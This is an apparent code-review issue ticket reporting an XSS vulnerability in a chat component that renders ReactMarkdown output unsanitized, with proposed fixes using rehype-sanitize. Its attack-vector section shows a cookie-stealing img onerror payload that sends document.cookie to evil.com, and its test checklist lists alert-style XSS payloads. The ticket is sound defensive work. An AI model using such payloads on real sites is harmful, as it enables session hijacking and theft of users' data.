---
status: completed
priority: p1
issue_id: 122
tags: [code-review, security, chat-components]
dependencies: []
---

# XSS Vulnerability in ReactMarkdown Chat Messages

## Problem Statement

The `ChatMessage` component renders user and assistant content using `ReactMarkdown` **without sanitization**. The `rehype-sanitize` package is installed but not used, leaving the application vulnerable to HTML/JavaScript injection attacks.

**Why it matters**: Attackers can inject malicious scripts through chat messages that execute in victims' browsers, enabling session hijacking, data theft, and phishing attacks.

## Findings

**Location**: `/apps/web/app/home/(user)/reports/[id]/_components/chat/chat-message.tsx` (lines 42-83)

**Current code**:
```typescript
<ReactMarkdown
  components={{
    code: CodeBlock,
    // ... styling components only, NO sanitization
  }}
>
  {content}  // UNSANITIZED USER CONTENT
</ReactMarkdown>
```

**Attack vector**: An attacker can send messages like:
```markdown
Hello! <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
```

**Evidence**: `rehype-sanitize@6.0.0` is in package.json but not imported or used anywhere in the chat components.

## Proposed Solutions

### Option A: Add rehype-sanitize plugin (Recommended)
```typescript
import rehypeSanitize from 'rehype-sanitize';

<ReactMarkdown
  rehypePlugins={[rehypeSanitize]}
  components={{...}}
>
  {content}
</ReactMarkdown>
```

**Pros**: Simple, uses already-installed package
**Cons**: None
**Effort**: 30 minutes
**Risk**: Low

### Option B: Custom restrictive schema
```typescript
import rehypeSanitize, { defaultSchema } from 'rehype-sanitize';

const sanitizeSchema = {
  ...defaultSchema,
  tagNames: ['p', 'br', 'strong', 'em', 'code', 'pre', 'ul', 'ol', 'li', 'blockquote', 'h1', 'h2', 'h3'],
  protocols: { href: ['http', 'https', 'mailto'] },
};

<ReactMarkdown rehypePlugins={[[rehypeSanitize, sanitizeSchema]]} />
```

**Pros**: Maximum security, explicit allowlist
**Cons**: May break edge cases
**Effort**: 1 hour
**Risk**: Low

## Recommended Action

Implement Option A immediately - it's a 30-minute fix that addresses a critical security vulnerability.

## Technical Details

**Affected files**:
- `/apps/web/app/home/(user)/reports/[id]/_components/chat/chat-message.tsx`

**Testing checklist**:
- [ ] XSS payloads are blocked: `<script>alert(1)</script>`, `<img src=x onerror="alert(1)">`
- [ ] Legitimate markdown renders correctly (code, lists, headers, links)
- [ ] Links with javascript: protocol are blocked

## Acceptance Criteria

- [ ] `rehype-sanitize` is imported and applied to ReactMarkdown
- [ ] XSS test payloads fail to execute
- [ ] Normal markdown rendering works correctly
- [ ] Typecheck passes

## Work Log

| Date | Action | Learnings |
|------|--------|-----------|
| 2025-12-29 | Created from code review | Security sentinel identified this as P0 critical |

## Resources

- [react-markdown security](https://github.com/remarkjs/react-markdown#security)
- [rehype-sanitize docs](https://github.com/rehypejs/rehype-sanitize)
- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
